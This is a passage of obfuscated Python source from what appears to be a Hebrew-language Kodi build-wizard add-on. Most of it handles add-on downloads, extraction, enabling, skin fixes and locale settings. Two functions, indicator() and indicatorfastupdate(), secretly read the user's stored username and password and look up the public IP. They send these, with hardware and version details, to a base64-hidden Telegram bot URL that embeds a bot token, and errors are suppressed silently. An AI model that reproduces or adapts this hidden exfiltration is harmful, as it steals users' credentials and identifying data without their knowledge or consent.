        O00O0OO0OOOO00OO0 .update (int (O0O00O00O0000O0O0 ),"Downloading "+name ,OO00O0O00OOO0O0OO ,OO00OO0O0O00O000O )#line:4092
  O00O0OO0000000O00 =xbmc .translatePath (os .path .join ('special://home','addons'))#line:4095
  OOO0O00OO00000OOO .close ()#line:4097
  extract (OOO00O00000O0O000 ,O00O0OO0000000O00 ,O00O0OO0OOOO00OO0 )#line:4099
  if os .path .exists (O00O0OO0000000O00 +'/scakemyer-script.quasar.burst'):#line:4100
    if os .path .exists (O00O0OO0000000O00 +'/script.quasar.burst'):#line:4101
     shutil .rmtree (O00O0OO0000000O00 +'/script.quasar.burst',ignore_errors =False )#line:4102
    os .rename (O00O0OO0000000O00 +'/scakemyer-script.quasar.burst',O00O0OO0000000O00 +'/script.quasar.burst')#line:4103
  if os .path .exists (O00O0OO0000000O00 +'/plugin.video.kmediatorrent-master'):#line:4105
    if os .path .exists (O00O0OO0000000O00 +'/plugin.video.kmediatorrent'):#line:4106
     shutil .rmtree (O00O0OO0000000O00 +'/plugin.video.kmediatorrent',ignore_errors =False )#line:4107
    os .rename (O00O0OO0000000O00 +'/plugin.video.kmediatorrent-master',O00O0OO0000000O00 +'/plugin.video.kmediatorrent')#line:4108
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:4109
  xbmc .executebuiltin ("UpdateAddonRepos")#line:4110
  try :#line:4111
    os .remove (OOO00O00000O0O000 )#line:4112
  except :#line:4113
    pass #line:4114
  O00O0OO0OOOO00OO0 .close ()#line:4115
def dis_or_enable_addon (OOO0O00O0OOO0OO00 ,O0O00O000OO00000O ,enable ="true"):#line:4116
    import json #line:4117
    O0O0OOO0OO00O0O00 ='"%s"'%OOO0O00O0OOO0OO00 #line:4118
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O00O0OOO0OO00 )and enable =="true":#line:4119
        logging .warning ('already Enabled')#line:4120
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO0O00O0OOO0OO00 )#line:4121
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO0O00O0OOO0OO00 )and enable =="false":#line:4122
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO0O00O0OOO0OO00 )#line:4123
    else :#line:4124
        OOO0O0OO0O0000OOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O0O0OOO0OO00O0O00 ,enable )#line:4125
        O0000OO00OO0O00O0 =xbmc .executeJSONRPC (OOO0O0OO0O0000OOO )#line:4126
        OOOOO00O00O000O0O =json .loads (O0000OO00OO0O00O0 )#line:4127
        if enable =="true":#line:4128
            xbmc .log ("### Enabled %s, response = %s"%(OOO0O00O0OOO0OO00 ,OOOOO00O00O000O0O ))#line:4129
        else :#line:4130
            xbmc .log ("### Disabled %s, response = %s"%(OOO0O00O0OOO0OO00 ,OOOOO00O00O000O0O ))#line:4131
    if O0O00O000OO00000O =='auto':#line:4132
     return True #line:4133
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:4134
def chunk_report (O000000OOO00OO00O ,O00000O0000O0OOOO ,OO0OO0OOOO000O000 ):#line:4135
   OOOOOOOOO00OO0O00 =float (O000000OOO00OO00O )/OO0OO0OOOO000O000 #line:4136
   OOOOOOOOO00OO0O00 =round (OOOOOOOOO00OO0O00 *100 ,2 )#line:4137
   if O000000OOO00OO00O >=OO0OO0OOOO000O000 :#line:4139
      sys .stdout .write ('\n')#line:4140
def chunk_read (O0000O00000OOO00O ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:4142
   import time #line:4143
   O0OOO000000000O00 =int (filesize )*1000000 #line:4144
   O00000O0000O000OO =0 #line:4146
   OOO00OOOOOO0OO000 =time .time ()#line:4147
   O0O0000O00OOO00O0 =0 #line:4148
   OOOOO00000O0000O0 ='[COLOR %s][B][/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,name ,wiz .checkBuild (name ,'version'))#line:4149
   logging .warning ('Downloading')#line:4150
   with open (destination ,"wb")as OOOO00O00O0OOO0O0 :#line:4151
    while 1 :#line:4152
      OO00O0O000O0O0OOO =time .time ()-OOO00OOOOOO0OO000 #line:4153
      OOO0OOOO000O0OOO0 =int (O0O0000O00OOO00O0 *chunk_size )#line:4154
      O0000OOO0O0O00O00 =O0000O00000OOO00O .read (chunk_size )#line:4155
      OOOO00O00O0OOO0O0 .write (O0000OOO0O0O00O00 )#line:4156
      OOOO00O00O0OOO0O0 .flush ()#line:4157
      O00000O0000O000OO +=len (O0000OOO0O0O00O00 )#line:4158
      OOO0OO00O000O0O00 =float (O00000O0000O000OO )/O0OOO000000000O00 #line:4159
      OOO0OO00O000O0O00 =round (OOO0OO00O000O0O00 *100 ,2 )#line:4160
      if int (OO00O0O000O0O0OOO )>0 :#line:4161
        O0O0O000OO0O00O00 =int (OOO0OOOO000O0OOO0 /(1024 *OO00O0O000O0O0OOO ))#line:4162
      else :#line:4163
         O0O0O000OO0O00O00 =0 #line:4164
      if O0O0O000OO0O00O00 >1024 and not OOO0OO00O000O0O00 ==100 :#line:4165
          O0OOOOO0O00OO0OOO =int (((O0OOO000000000O00 -OOO0OOOO000O0OOO0 )/1024 )/(O0O0O000OO0O00O00 ))#line:4166
      else :#line:4167
          O0OOOOO0O00OO0OOO =0 #line:4168
      if O0OOOOO0O00OO0OOO <0 :#line:4169
        O0OOOOO0O00OO0OOO =0 #line:4170
      dp .update (int (OOO0OO00O000O0O00 ),"[B]Downloading:[/B]"+OOOOO00000O0000O0 ,"\r%d%%,[COLOR silver] %d MB / %d MB [/COLOR], %d KB/s "%(OOO0OO00O000O0O00 ,OOO0OOOO000O0OOO0 /(1024 *1024 ),O0OOO000000000O00 /(1000 *1000 ),O0O0O000OO0O00O00 ),'[B]Time Left: [/B] [COLOR silver]%02d:%02d[/COLOR]'%divmod (O0OOOOO0O00OO0OOO ,60 ))#line:4172
      if dp .iscanceled ():#line:4173
         dp .close ()#line:4174
         break #line:4175
      if not O0000OOO0O0O00O00 :#line:4176
         break #line:4177
      if report_hook :#line:4179
         report_hook (O00000O0000O000OO ,chunk_size ,O0OOO000000000O00 )#line:4180
      O0O0000O00OOO00O0 +=1 #line:4181
   logging .warning ('END Downloading')#line:4182
   return O00000O0000O000OO #line:4183
def googledrive_download (OOOOO0OO0OOOOOO0O ,OOOO0O0O000O00OO0 ,OOO0O0O00OOO00O0O ,OO00OO0O00OO0OO00 ):#line:4185
    OO0O00OOO0000O00O =[]#line:4189
    OOOO0O0O0OOOOOO0O =OOOOO0OO0OOOOOO0O .split ('=')#line:4190
    OOOOO0OO0OOOOOO0O =OOOO0O0O0OOOOOO0O [len (OOOO0O0O0OOOOOO0O )-1 ]#line:4191
    def O00O00OO00O00O00O (OO00OO0OO00OOO000 ):#line:4193
        for O0O0OO0O0O000000O in OO00OO0OO00OOO000 :#line:4195
            logging .warning ('cookie.name')#line:4196
            logging .warning (O0O0OO0O0O000000O .name )#line:4197
            OO0O0000O00O000O0 =O0O0OO0O0O000000O .value #line:4198
            if 'download_warning'in O0O0OO0O0O000000O .name :#line:4199
                logging .warning (O0O0OO0O0O000000O .value )#line:4200
                logging .warning ('cookie.value')#line:4201
                return O0O0OO0O0O000000O .value #line:4202
            return OO0O0000O00O000O0 #line:4203
        return None #line:4205
    def OO000O0000000O00O (O00OOOO00000O0OOO ,O0O0000O0OO000O0O ):#line:4207
        O0000OOOOOO0000OO =32768 #line:4209
        O0OOO0OOO0000O0OO =time .time ()#line:4210
        with open (O0O0000O0OO000O0O ,"wb")as OOOO0000OOO00O00O :#line:4212
            O00O000OOOO0O0000 =1 #line:4213
            OOO0O000O0OO00O00 =32768 #line:4214
            try :#line:4215
                OOO000O0000O0O0OO =int (O00OOOO00000O0OOO .headers .get ('content-length'))#line:4216
                print ('file total size :',OOO000O0000O0O0OO )#line:4217
            except TypeError :#line:4218
                print ('using dummy length !!!')#line:4219
                OOO000O0000O0O0OO =int (OO00OO0O00OO0OO00 )*1000000 #line:4220
            for O0OOO000000O00O0O in O00OOOO00000O0OOO .iter_content (O0000OOOOOO0000OO ):#line:4221
                if O0OOO000000O00O0O :#line:4222
                    OOOO0000OOO00O00O .write (O0OOO000000O00O0O )#line:4223
                    OOOO0000OOO00O00O .flush ()#line:4224
                    O00O000O000OO000O =time .time ()-O0OOO0OOO0000O0OO #line:4225
                    OOO00OOO0O0000000 =int (O00O000OOOO0O0000 *OOO0O000O0OO00O00 )#line:4226
                    if O00O000O000OO000O ==0 :#line:4227
                        O00O000O000OO000O =0.1 #line:4228
                    OO0O0OO0O000O0000 =int (OOO00OOO0O0000000 /(1024 *O00O000O000OO000O ))#line:4229
                    OO00OO0O0OO0O0O00 =int (O00O000OOOO0O0000 *OOO0O000O0OO00O00 *100 /OOO000O0000O0O0OO )#line:4230
                    if OO0O0OO0O000O0000 >1024 and not OO00OO0O0OO0O0O00 ==100 :#line:4231
                      O000000O00OO000OO =int (((OOO000O0000O0O0OO -OOO00OOO0O0000000 )/1024 )/(OO0O0OO0O000O0000 ))#line:4232
                    else :#line:4233
                      O000000O00OO000OO =0 #line:4234
                    OOO0O0O00OOO00O0O .update (int (OO00OO0O0OO0O0O00 ),name ,"\r%d%%,[COLOR salmon] %d MB / %d MB [/COLOR], %d KB/s "%(OO00OO0O0OO0O0O00 ,OOO00OOO0O0000000 /(1024 *1024 ),OOO000O0000O0O0OO /(1000 *1000 ),OO0O0OO0O000O0000 ),'[B]ETA:[/B] [COLOR salmon]%02d:%02d[/COLOR]'%divmod (O000000O00OO000OO ,60 ))#line:4236
                    O00O000OOOO0O0000 +=1 #line:4237
                    if OOO0O0O00OOO00O0O .iscanceled ():#line:4238
                     OOO0O0O00OOO00O0O .close ()#line:4239
                     break #line:4240
    O00O00O0OO000O00O ="https://docs.google.com/uc?export=download"#line:4241
    import urllib2 #line:4246
    import cookielib #line:4247
    from cookielib import CookieJar #line:4249
    O00OOOOO0OO000OO0 =CookieJar ()#line:4251
    OO0OO000O00OO0000 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O00OOOOO0OO000OO0 ))#line:4252
    OOOO0OO0OO0OO0000 ={'id':OOOOO0OO0OOOOOO0O }#line:4254
    OOOO0000OO0000000 =urllib .urlencode (OOOO0OO0OO0OO0000 )#line:4255
    logging .warning (O00O00O0OO000O00O +'&'+OOOO0000OO0000000 )#line:4256
    O000O0OOO0OOOOOOO =OO0OO000O00OO0000 .open (O00O00O0OO000O00O +'&'+OOOO0000OO0000000 )#line:4257
    O00OO00OO0OOO0O0O =O000O0OOO0OOOOOOO .read ()#line:4258
    for OOO0OO0OO0000000O in O00OOOOO0OO000OO0 :#line:4260
         logging .warning (OOO0OO0OO0000000O )#line:4261
    O0O000OO0O0OO00O0 =O00O00OO00O00O00O (O00OOOOO0OO000OO0 )#line:4262
    logging .warning (O0O000OO0O0OO00O0 )#line:4263
    if O0O000OO0O0OO00O0 :#line:4264
        O00OOO0OOO0000000 ={'id':OOOOO0OO0OOOOOO0O ,'confirm':O0O000OO0O0OO00O0 }#line:4265
        OOOOO0OO00O0O0OO0 ={'Access-Control-Allow-Headers':'Content-Length'}#line:4266
        OOOO0000OO0000000 =urllib .urlencode (O00OOO0OOO0000000 )#line:4267
        O000O0OOO0OOOOOOO =OO0OO000O00OO0000 .open (O00O00O0OO000O00O +'&'+OOOO0000OO0000000 )#line:4268
        chunk_read (O000O0OOO0OOOOOOO ,report_hook =chunk_report ,dp =OOO0O0O00OOO00O0O ,destination =OOOO0O0O000O00OO0 ,filesize =OO00OO0O00OO0OO00 )#line:4269
    return (OO0O00OOO0000O00O )#line:4273
def kodi17Fix ():#line:4274
	O000OO000O000OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:4275
	OOOOOOO0O0000OO00 =[]#line:4276
	for OO0O0OO0OOO0OOO00 in sorted (O000OO000O000OO0O ,key =lambda OOOOOOOO0O000000O :OOOOOOOO0O000000O ):#line:4277
		OOOO000O0OO0OO0OO =os .path .join (OO0O0OO0OOO0OOO00 ,'addon.xml')#line:4278
		if os .path .exists (OOOO000O0OO0OO0OO ):#line:4279
			O00OO0000OOOO0OOO =OO0O0OO0OOO0OOO00 .replace (ADDONS ,'')[1 :-1 ]#line:4280
			O0O00OOOO0O00O0OO =open (OOOO000O0OO0OO0OO )#line:4281
			O00O00O0000O0O0O0 =O0O00OOOO0O00O0OO .read ()#line:4282
			O0OO00OO00O0O0000 =parseDOM (O00O00O0000O0O0O0 ,'addon',ret ='id')#line:4283
			O0O00OOOO0O00O0OO .close ()#line:4284
			try :#line:4285
				OOOOOOOO0O00000O0 =xbmcaddon .Addon (id =O0OO00OO00O0O0000 [0 ])#line:4286
			except :#line:4287
				try :#line:4288
					log ("%s was disabled"%O0OO00OO00O0O0000 [0 ],xbmc .LOGDEBUG )#line:4289
					OOOOOOO0O0000OO00 .append (O0OO00OO00O0O0000 [0 ])#line:4290
				except :#line:4291
					try :#line:4292
						log ("%s was disabled"%O00OO0000OOOO0OOO ,xbmc .LOGDEBUG )#line:4293
						OOOOOOO0O0000OO00 .append (O00OO0000OOOO0OOO )#line:4294
					except :#line:4295
						if len (O0OO00OO00O0O0000 )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%O00OO0000OOOO0OOO ,xbmc .LOGERROR )#line:4296
						else :log ("Unabled to enable: %s"%OO0O0OO0OOO0OOO00 ,xbmc .LOGERROR )#line:4297
	if len (OOOOOOO0O0000OO00 )>0 :#line:4298
		O00OOOO0OOOOO0O0O =0 #line:4299
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:4300
		for OO0OO00OOO0O0OO00 in OOOOOOO0O0000OO00 :#line:4301
			O00OOOO0OOOOO0O0O +=1 #line:4302
			O0000O00OOO0O000O =int (percentage (O00OOOO0OOOOO0O0O ,len (OOOOOOO0O0000OO00 )))#line:4303
			DP .update (O0000O00OOO0O000O ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO00OOO0O0OO00 ))#line:4304
			addonDatabase (OO0OO00OOO0O0OO00 ,1 )#line:4305
			if DP .iscanceled ():break #line:4306
		if DP .iscanceled ():#line:4307
			DP .close ()#line:4308
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:4309
			sys .exit ()#line:4310
		DP .close ()#line:4311
	forceUpdate ()#line:4312
def indicator ():#line:4314
       try :#line:4315
          import json #line:4316
          wiz .log ('FRESH MESSAGE')#line:4317
          O0OOOO00O0OOOO0O0 =(ADDON .getSetting ("user"))#line:4318
          O0OOOO00O000O0OOO =(ADDON .getSetting ("pass"))#line:4319
          OOO0000OOOOOOO0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4320
          OO00OO00OOO0O000O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten16DXlCDXqdecINeU15HXmdec15MgLSA='#line:4321
          OOO00O00000O0OO00 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4322
          O0O0000OO0O0OO0OO =str (json .loads (OOO00O00000O0OO00 )['ip'])#line:4323
          O0O000O00OO0O0O00 =O0OOOO00O0OOOO0O0 #line:4324
          OOO0OO00OOO0OO0OO =O0OOOO00O000O0OOO #line:4325
          import socket #line:4326
          OOO00O00000O0OO00 =urllib2 .urlopen (OO00OO00OOO0O000O .decode ('base64')+ADDON .getLocalizedString (32011 )+(HARDWAER )+ADDON .getLocalizedString (32012 )+O0O000O00OO0O0O00 +ADDON .getLocalizedString (32013 )+OOO0OO00OOO0OO0OO +ADDON .getLocalizedString (32014 )+OOO0000OOOOOOO0O0 +ADDON .getLocalizedString (32015 )+O0O0000OO0O0OO0OO +ADDON .getLocalizedString (32016 )+platform .system ()).readlines ()#line:4327
       except :pass #line:4329
def indicatorfastupdate ():#line:4331
       try :#line:4332
          import json #line:4333
          wiz .log ('FRESH MESSAGE')#line:4334
          OOOO0O0O00O00OOOO =(ADDON .getSetting ("user"))#line:4335
          O0O0O0000O0000O0O =(ADDON .getSetting ("pass"))#line:4336
          O0000O0O0000OOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:4337
          O0OO000OOOOOO00O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXk9eb15XXnyDXnteU15nXqCAtIA=='#line:4339
          O0O0O0OOOOO000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:4340
          OO0OOOO00OO0OOO00 =str (json .loads (O0O0O0OOOOO000OO0 )['ip'])#line:4341
          OOO0O0OO0OO000O0O =OOOO0O0O00O00OOOO #line:4342
          OOO0OO000O00OO0OO =O0O0O0000O0000O0O #line:4343
          import socket #line:4345
          O0O0O0OOOOO000OO0 =urllib2 .urlopen (O0OO000OOOOOO00O0 .decode ('base64')+ADDON .getLocalizedString (32011 )+(HARDWAER )+ADDON .getLocalizedString (32012 )+OOO0O0OO0OO000O0O +ADDON .getLocalizedString (32013 )+OOO0OO000O00OO0OO +ADDON .getLocalizedString (32014 )+O0000O0O0000OOOOO +ADDON .getLocalizedString (32015 )+OO0OOOO00OO0OOO00 +ADDON .getLocalizedString (32016 )+platform .system ()).readlines ()#line:4346
       except :pass #line:4349
def skinfix18 ():#line:4351
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:4352
		O00000000000OOO0O =wiz .workingURL (SKINID18DDONXML )#line:4353
		if O00000000000OOO0O ==True :#line:4354
			OOO0OOO000OOO0O0O =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:4355
			if len (OOO0OOO000OOO0O0O )>0 :#line:4356
				O0O00OOOO0OO00O00 ='%s-%s.zip'%(SKINID18 ,OOO0OOO000OOO0O0O [0 ])#line:4357
				OO00000OO0OOOOO0O =wiz .workingURL (SKIN18ZIPURL +O0O00OOOO0OO00O00 )#line:4358
				if OO00000OO0OOOOO0O ==True :#line:4359
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4360
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4361
					OO00O0O0OO0OOOO0O =os .path .join (PACKAGES ,O0O00OOOO0OO00O00 )#line:4362
					try :os .remove (OO00O0O0OO0OOOO0O )#line:4363
					except :pass #line:4364
					downloader .download (SKIN18ZIPURL +O0O00OOOO0OO00O00 ,OO00O0O0OO0OOOO0O ,DP )#line:4365
					extract .all (OO00O0O0OO0OOOO0O ,HOME ,DP )#line:4366
					try :#line:4367
						OO0O0O00OO0OOO000 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4368
						O00OOOO000O0O000O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4369
						os .rename (OO0O0O00OO0OOO000 ,O00OOOO000O0O000O )#line:4370
					except :#line:4371
						pass #line:4372
					try :#line:4373
						OOO0OOO00OO0000O0 =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O00O0O0O00OOOO000 =OOO0OOO00OO0000O0 .read ();OOO0OOO00OO0000O0 .close ()#line:4374
						OO000O00O0OO0000O =wiz .parseDOM (O00O0O0O00OOOO000 ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:4375
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000O00O0OO0000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:4376
					except :#line:4377
						pass #line:4378
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:4379
					DP .close ()#line:4380
					xbmc .sleep (500 )#line:4381
					wiz .forceUpdate (True )#line:4382
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4383
				else :#line:4384
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4385
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO00000OO0OOOOO0O ,xbmc .LOGERROR )#line:4386
			else :#line:4387
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4388
		else :#line:4389
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4390
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4391
def skinfix17 ():#line:4392
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:4393
		O0OO000O000O00OOO =wiz .workingURL (SKINID17DDONXML )#line:4394
		if O0OO000O000O00OOO ==True :#line:4395
			O00OO0O000O0OO0OO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:4396
			if len (O00OO0O000O0OO0OO )>0 :#line:4397
				O0OO0OO0O0O000OO0 ='%s-%s.zip'%(SKINID17 ,O00OO0O000O0OO0OO [0 ])#line:4398
				OO0O0OOO00OO00OO0 =wiz .workingURL (SKIN17ZIPURL +O0OO0OO0O0O000OO0 )#line:4399
				if OO0O0OOO00OO00OO0 ==True :#line:4400
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:4401
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4402
					O000OOOO00OO0O0OO =os .path .join (PACKAGES ,O0OO0OO0O0O000OO0 )#line:4403
					try :os .remove (O000OOOO00OO0O0OO )#line:4404
					except :pass #line:4405
					downloader .download (SKIN17ZIPURL +O0OO0OO0O0O000OO0 ,O000OOOO00OO0O0OO ,DP )#line:4406
					extract .all (O000OOOO00OO0O0OO ,HOME ,DP )#line:4407
					try :#line:4408
						OOOOOO0O00O0O0O00 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:4409
						OOO00O0O0O0OOOO0O =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:4410
						os .rename (OOOOOO0O00O0O0O00 ,OOO00O0O0O0OOOO0O )#line:4411
					except :#line:4412
						pass #line:4413
					try :#line:4414
						OOOO0O0OO0OOOOOOO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');OO00O0OO0O0O0OOO0 =OOOO0O0OO0OOOOOOO .read ();OOOO0O0OO0OOOOOOO .close ()#line:4415
						OO00O0O0O00O0000O =wiz .parseDOM (OO00O0OO0O0O0OOO0 ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:4416
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO00O0O0O00O0000O [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:4417
					except :#line:4418
						pass #line:4419
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:4420
					DP .close ()#line:4421
					xbmc .sleep (500 )#line:4422
					wiz .forceUpdate (True )#line:4423
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:4424
				else :#line:4425
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:4426
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0O0OOO00OO00OO0 ,xbmc .LOGERROR )#line:4427
			else :#line:4428
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:4429
		else :#line:4430
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:4431
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:4432
def fix17update ():#line:4433
	if KODIV >=17 and KODIV <18 :#line:4434
		wiz .kodi17Fix ()#line:4435
		xbmc .sleep (4000 )#line:4436
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4437
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4438
		fixfont ()#line:4439
		O000O00O00OO0OOOO =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4440
		try :#line:4442
			OOO000OOO000O00O0 =open (O000O00O00OO0OOOO ,'r')#line:4443
			OOO00O0O0OOO0O0OO =OOO000OOO000O00O0 .read ()#line:4444
			OOO000OOO000O00O0 .close ()#line:4445
			O00O0O0OO00O0O0O0 ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:4446
			O00O0OOOOOOO0OO00 =re .compile (O00O0O0OO00O0O0O0 ).findall (OOO00O0O0OOO0O0OO )[0 ]#line:4447
			OOO000OOO000O00O0 =open (O000O00O00OO0OOOO ,'w')#line:4448
			OOO000OOO000O00O0 .write (OOO00O0O0OOO0O0OO .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%O00O0OOOOOOO0OO00 ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:4449
			OOO000OOO000O00O0 .close ()#line:4450
		except :#line:4451
				pass #line:4452
		wiz .kodi17Fix ()#line:4453
		O000O00O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4454
		try :#line:4455
			OOO000OOO000O00O0 =open (O000O00O00OO0OOOO ,'r')#line:4456
			OOO00O0O0OOO0O0OO =OOO000OOO000O00O0 .read ()#line:4457
			OOO000OOO000O00O0 .close ()#line:4458
			O00O0O0OO00O0O0O0 ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:4459
			O00O0OOOOOOO0OO00 =re .compile (O00O0O0OO00O0O0O0 ).findall (OOO00O0O0OOO0O0OO )[0 ]#line:4460
			OOO000OOO000O00O0 =open (O000O00O00OO0OOOO ,'w')#line:4461
			OOO000OOO000O00O0 .write (OOO00O0O0OOO0O0OO .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%O00O0OOOOOOO0OO00 ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:4462
			OOO000OOO000O00O0 .close ()#line:4463
		except :#line:4464
				pass #line:4465
		swapSkins ('skin.Premium.mod')#line:4466
def fix18update ():#line:4468
	if KODIV >=18 :#line:4469
		xbmc .sleep (4000 )#line:4470
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:4471
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:4472
		fixfont ()#line:4473
		OOO000O0OOOOO0O0O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:4474
		try :#line:4475
			O0O0OOO000O000000 =open (OOO000O0OOOOO0O0O ,'r')#line:4476
			O0OOO00OO0O0OOO0O =O0O0OOO000O000000 .read ()#line:4477
			O0O0OOO000O000000 .close ()#line:4478
			OO000000OO0O0O0O0 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:4479
			O000O0OO0OOOOOO0O =re .compile (OO000000OO0O0O0O0 ).findall (O0OOO00OO0O0OOO0O )[0 ]#line:4480
			O0O0OOO000O000000 =open (OOO000O0OOOOO0O0O ,'w')#line:4481
			O0O0OOO000O000000 .write (O0OOO00OO0O0OOO0O .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O000O0OO0OOOOOO0O ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:4482
			O0O0OOO000O000000 .close ()#line:4483
		except :#line:4484
				pass #line:4485
		wiz .kodi17Fix ()#line:4486
		OOO000O0OOOOO0O0O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:4487
		try :#line:4488
			O0O0OOO000O000000 =open (OOO000O0OOOOO0O0O ,'r')#line:4489
			O0OOO00OO0O0OOO0O =O0O0OOO000O000000 .read ()#line:4490
			O0O0OOO000O000000 .close ()#line:4491
			OO000000OO0O0O0O0 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:4492
			O000O0OO0OOOOOO0O =re .compile (OO000000OO0O0O0O0 ).findall (O0OOO00OO0O0OOO0O )[0 ]#line:4493
			O0O0OOO000O000000 =open (OOO000O0OOOOO0O0O ,'w')#line:4494
			O0O0OOO000O000000 .write (O0OOO00OO0O0OOO0O .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O000O0OO0OOOOOO0O ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:4495
			O0O0OOO000O000000 .close ()#line:4496
